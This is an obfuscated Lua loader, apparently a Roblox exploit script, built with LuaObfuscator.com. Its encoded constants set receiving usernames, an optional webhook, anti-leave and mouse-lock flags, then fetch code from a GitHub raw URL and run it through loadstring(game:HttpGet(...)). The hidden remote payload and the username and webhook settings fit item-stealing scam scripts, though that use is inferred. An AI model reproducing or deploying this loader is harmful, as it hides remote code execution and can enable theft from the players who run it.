--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.14) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v79=0;local v80;while true do if (v79==0) then v80=v2(v0(v30,16));if v19 then local v97=v5(v80,v19);v19=nil;return v97;else return v80;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v81=(v31/((5 -3)^(v32-((1 + 1) -1))))%(2^(((v33-((1 + 0) -0)) -(v32-(2 -1))) + (620 -(555 + 64)))) ;return v81-(v81%(932 -(857 + 74))) ;else local v82=2^(v32-((1446 -(282 + 595)) -(367 + 201))) ;return (((v31%(v82 + v82))>=v82) and 1) or (927 -(214 + 713)) ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + 2 );v18=v18 + (1639 -(1523 + 114)) ;return (v36 * (231 + 25)) + v35 ;end local function v23()local v37,v38,v39,v40=v1(v16,v18,v18 + ((960 -(892 + 65)) -0) );v18=v18 + (17 -13) ;return (v40 * (16777333 -(32 + (202 -117)))) + (v39 * (66601 -(68 + 997))) + (v38 * ((104 -47) + 199)) + v37 ;end local function v24()local v41=v23();local v42=v23();local v43=1 -0 ;local v44=(v20(v42,351 -(87 + 263) ,(710 -510) -(67 + 113) ) * ((2 + 0)^(78 -46))) + v41 ;local v45=v20(v42,16 + 5 ,123 -92 );local v46=((v20(v42,100 -68 )==(19 -(10 + (867 -(814 + 45))))) and  -(953 -(802 + 150))) or (2 -1) ;if (v45==(0 -0)) then if (v44==(0 + 0)) then return v46 * (0 -0) ;else local v88=0 + 0 ;while true do if (v88==(430 -(44 + 386))) then v45=1487 -(998 + 488) ;v43=(0 -0) + 0 ;break;end end end elseif (v45==(3044 -(50 + 865 + 82))) then return ((v44==(0 -0)) and (v46 * ((1 + 0)/(1138 -(116 + 362 + 660))))) or (v46 * NaN) ;end return v8(v46,v45-(1344 -321) ) * (v43 + (v44/(((887 -(261 + 624)) + (0 -0))^(1239 -(1069 + (1198 -(1020 + 60))))))) ;end local function v25(v47)local v48=1423 -(630 + 793) ;local v49;local v50;while true do if (v48==3) then return v6(v50);end if (v48==0) then v49=nil;if  not v47 then local v96=0 -0 ;while true do if (v96==(0 -0)) then v47=v23();if (v47==(0 + 0)) then return "";end break;end end end v48=1;end if (v48==(6 -4)) then v50={};for v89=2 -1 , #v49 do v50[v89]=v2(v1(v3(v49,v89,v89)));end v48=1750 -((2981 -2221) + 987) ;end if (v48==(1914 -(15 + 1774 + 124))) then v49=v3(v16,v18,(v18 + v47) -(767 -(745 + 21)) );v18=v18 + v47 ;v48=1 + 1 ;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v51=0;local v52;local v53;local v54;local v55;local v56;local v57;local v58;while true do if (v51~=(1 + 0)) then else local v86=0 + 0 ;while true do if (v86~=0) then else v54=nil;v55=nil;v86=122 -(17 + 104) ;end if (v86==(1 -0)) then v51=2 + 0 ;break;end end end if (v51~=0) then else v52=0;v53=nil;v51=1;end if (v51~=(2 + 1)) then else v58=nil;while true do local v91=0;while true do if (v91==(0 -0)) then if (v52==3) then local v98=0;local v99;while true do if (v98~=(0 -0)) then else v99=0 + 0 ;while true do if (v99==(1636 -(1373 + 263))) then for v162=1001 -(451 + 549) ,v23() do v54[v162-(1 + 0) ]=v28();end return v56;end end break;end end end if (v52==1) then local v100=0;while true do if (v100~=(1 -0)) then else v58={};v52=2;break;end if ((0 -0)==v100) then v56={v53,v54,nil,v55};v57=v23();v100=1;end end end v91=1;end if (v91~=1) then else if ((343 -(218 + 123))==v52) then local v101=0;local v102;while true do if (v101~=(1581 -(1535 + 46))) then else v102=0;while true do if (v102~=(1 + 0)) then else for v164=1,v23() do local v165=0 + 0 ;local v166;local v167;local v168;while true do if (v165==(561 -(306 + 254))) then v168=nil;while true do if (v166~=(1 + 0)) then else while true do if ((0 -0)==v167) then v168=v21();if (v20(v168,1468 -(899 + 568) ,1)~=0) then else local v179=0 + 0 ;local v180;local v181;local v182;local v183;while true do if (v179==(2 -1)) then v182=nil;v183=nil;v179=2;end if (v179==(603 -(268 + 335))) then v180=290 -(60 + 230) ;v181=nil;v179=1;end if (2~=v179) then else while true do if (v180==3) then if (v20(v182,575 -(426 + 146) ,1 + 2 )~=(1457 -(282 + 1174))) then else v183[4]=v58[v183[815 -(569 + 242) ]];end v53[v164]=v183;break;end if (v180~=0) then else local v186=0 -0 ;local v187;while true do if (v186==0) then v187=0;while true do if (v187~=(0 + 0)) then else local v199=1024 -(706 + 318) ;while true do if (v199==1) then v187=1;break;end if (v199==0) then v181=v20(v168,2,3);v182=v20(v168,1255 -(721 + 530) ,1277 -(945 + 326) );v199=1;end end end if (v187~=1) then else v180=1;break;end end break;end end end if (v180~=1) then else local v188=0;while true do if (v188==(2 -1)) then v180=2;break;end if (v188~=(0 + 0)) then else v183={v22(),v22(),nil,nil};if (v181==(1086 -(461 + 625))) then local v195=1288 -(993 + 295) ;local v196;local v197;local v198;while true do if (v195~=0) then else v196=0 + 0 ;v197=nil;v195=1;end if (1==v195) then v198=nil;while true do if (v196==0) then local v202=1171 -(418 + 753) ;while true do if (v202==(1 + 0)) then v196=1 + 0 ;break;end if (v202==0) then v197=0 + 0 ;v198=nil;v202=1 + 0 ;end end end if (v196~=1) then else while true do if (v197~=0) then else v198=0;while true do if (v198==(529 -(406 + 123))) then v183[1772 -(1749 + 20) ]=v22();v183[4]=v22();break;end end break;end end break;end end break;end end elseif (v181==(1 + 0)) then v183[3]=v23();elseif (v181==2) then v183[1325 -(1249 + 73) ]=v23() -((1 + 1)^(1161 -(466 + 679))) ;elseif (v181==3) then local v203=0;local v204;local v205;while true do if (v203==1) then while true do if ((0 -0)~=v204) then else v205=0 -0 ;while true do if ((1900 -(106 + 1794))~=v205) then else v183[3]=v23() -(2^(6 + 10)) ;v183[2 + 2 ]=v22();break;end end break;end end break;end if (v203~=(0 -0)) then else local v206=0;while true do if ((0 -0)~=v206) then else v204=0;v205=nil;v206=115 -(4 + 110) ;end if ((585 -(57 + 527))==v206) then v203=1428 -(41 + 1386) ;break;end end end end end v188=1;end end end if (2~=v180) then else if (v20(v182,1,104 -(17 + 86) )~=(1 + 0)) then else v183[3 -1 ]=v58[v183[2]];end if (v20(v182,5 -3 ,2)~=1) then else v183[169 -(122 + 44) ]=v58[v183[3]];end v180=5 -2 ;end end break;end end end break;end end break;end if (v166==0) then v167=0 -0 ;v168=nil;v166=1 + 0 ;end end break;end if (v165==0) then v166=0;v167=nil;v165=1 + 0 ;end end end v52=5 -2 ;break;end if (0~=v102) then else for v169=1,v57 do local v170=65 -(30 + 35) ;local v171;local v172;local v173;while true do if (v170==(0 + 0)) then v171=1257 -(1043 + 214) ;v172=nil;v170=1;end if (v170~=1) then else v173=nil;while true do if (v171==1) then if (v172==1) then v173=v21()~=0 ;elseif (v172==2) then v173=v24();elseif (v172~=(11 -8)) then else v173=v25();end v58[v169]=v173;break;end if (v171==(1212 -(323 + 889))) then local v177=0;local v178;while true do if (v177==0) then v178=0 -0 ;while true do if (v178~=1) then else v171=581 -(361 + 219) ;break;end if (v178==0) then local v184=320 -(53 + 267) ;while true do if (v184~=(1 + 0)) then else v178=1;break;end if (v184~=0) then else v172=v21();v173=nil;v184=414 -(15 + 398) ;end end end end break;end end end end break;end end end v56[3]=v21();v102=1;end end break;end end end if (v52~=(982 -(18 + 964))) then else v53={};v54={};v55={};v52=3 -2 ;end break;end end end break;end if (v51~=2) then else local v87=0;while true do if (v87==1) then v51=2 + 1 ;break;end if (v87~=(0 + 0)) then else v56=nil;v57=nil;v87=1;end end end end end local function v29(v59,v60,v61)local v62=v59[1];local v63=v59[2];local v64=v59[3];return function(...)local v65=v62;local v66=v63;local v67=v64;local v68=v27;local v69=1;local v70= -1;local v71={};local v72={...};local v73=v12("#",...) -1 ;local v74={};local v75={};for v83=0,v73 do if (v83>=v67) then v71[v83-v67 ]=v72[v83 + 1 ];else v75[v83]=v72[v83 + 1 ];end end local v76=(v73-v67) + 1 ;local v77;local v78;while true do v77=v65[v69];v78=v77[1];if (v78<=13) then if (v78<=6) then if (v78<=2) then if (v78<=0) then v75[v77[2]]=v61[v77[3]];elseif (v78>1) then local v110=0;local v111;local v112;while true do if (v110==0) then v111=v77[2];v112=v75[v77[3]];v110=1;end if (v110==1) then v75[v111 + 1 ]=v112;v75[v111]=v112[v77[4]];break;end end else v75[v77[2]]();end elseif (v78<=4) then if (v78>3) then v61[v77[3]]=v75[v77[2]];else v75[v77[2]][v77[3]]=v77[4];end elseif (v78>5) then local v117=v77[2];local v118,v119=v68(v75[v117](v13(v75,v117 + 1 ,v77[3])));v70=(v119 + v117) -1 ;local v120=0;for v143=v117,v70 do local v144=0;while true do if (0==v144) then v120=v120 + 1 ;v75[v143]=v118[v120];break;end end end elseif (v75[v77[2]]==v77[4]) then v69=v69 + 1 ;else v69=v77[3];end elseif (v78<=9) then if (v78<=7) then local v105=v77[2];v75[v105]=v75[v105](v13(v75,v105 + 1 ,v70));elseif (v78>8) then for v145=v77[2],v77[3] do v75[v145]=nil;end else v75[v77[2]][v77[3]]=v77[4];end elseif (v78<=11) then if (v78==10) then v61[v77[3]]=v75[v77[2]];elseif (v77[2]==v75[v77[4]]) then v69=v69 + 1 ;else v69=v77[3];end elseif (v78>12) then for v147=v77[2],v77[3] do v75[v147]=nil;end else v75[v77[2]]=v77[3]~=0 ;end elseif (v78<=20) then if (v78<=16) then if (v78<=14) then v69=v77[3];elseif (v78==15) then v75[v77[2]]=v77[3]~=0 ;elseif (v77[2]==v75[v77[4]]) then v69=v69 + 1 ;else v69=v77[3];end elseif (v78<=18) then if (v78==17) then v75[v77[2]]=v77[3];else local v129=v77[2];v75[v129]=v75[v129](v13(v75,v129 + 1 ,v70));end elseif (v78>19) then v75[v77[2]]=v61[v77[3]];else do return;end end elseif (v78<=23) then if (v78<=21) then v75[v77[2]]=v77[3];elseif (v78==22) then local v133=v77[2];local v134=v75[v77[3]];v75[v133 + 1 ]=v134;v75[v133]=v134[v77[4]];else v75[v77[2]]();end elseif (v78<=25) then if (v78==24) then if (v75[v77[2]]==v77[4]) then v69=v69 + 1 ;else v69=v77[3];end else v69=v77[3];end elseif (v78==26) then local v139=v77[2];local v140,v141=v68(v75[v139](v13(v75,v139 + 1 ,v77[3])));v70=(v141 + v139) -1 ;local v142=0;for v149=v139,v70 do v142=v142 + 1 ;v75[v149]=v140[v142];end else do return;end end v69=v69 + 1 ;end end;end return v29(v28(),{},v17)(...);end v15("LOL!133O00028O00027O0040026O00F03F026O00084003023O005F4703093O00416E74694C656176652O0103093O004D6F7573654C6F636B03083O00557365724E616D65030C3O004B7572745F6269626531323303073O00576562682O6F6B030C3O002E20286F7074696F6E616C29030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034B3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4B757269746F5363726970747A2F4B754D612D4875622F6D61696E2F4B757269746F5363726970747303093O00557365724E616D6532030C3O00756E736F796D6F3233346D6F030D3O004C6F6164696E675363722O656E00413O0012153O00014O000D000100013O0026183O00020001000100040E3O00020001001215000100013O002618000100140001000200040E3O00140001001215000200013O000E0B0003000C0001000200040E3O000C0001001215000100043O00040E3O00140001002618000200080001000100040E3O00080001001214000300053O003003000300060007001214000300053O003003000300080007001215000200033O00040E3O00080001002618000100230001000100040E3O00230001001215000200013O000E0B0003001B0001000200040E3O001B0001001215000100033O00040E3O00230001002618000200170001000100040E3O001700010012150003000A3O00120A000300093O0012150003000C3O00120A0003000B3O001215000200033O00040E3O001700010026180001002E0001000400040E3O002E00010012140002000D3O0012140003000E3O00200200030003000F001215000500104O000F000600014O001A000300064O000700023O00022O001700020001000100040E3O00400001002618000100050001000300040E3O00050001001215000200013O002618000200380001000100040E3O00380001001215000300123O00120A000300113O001214000300053O003003000300130007001215000200033O002618000200310001000300040E3O00310001001215000100023O00040E3O0005000100040E3O0031000100040E3O0005000100040E3O0040000100040E3O000200012O001B3O00017O00",v9(),...);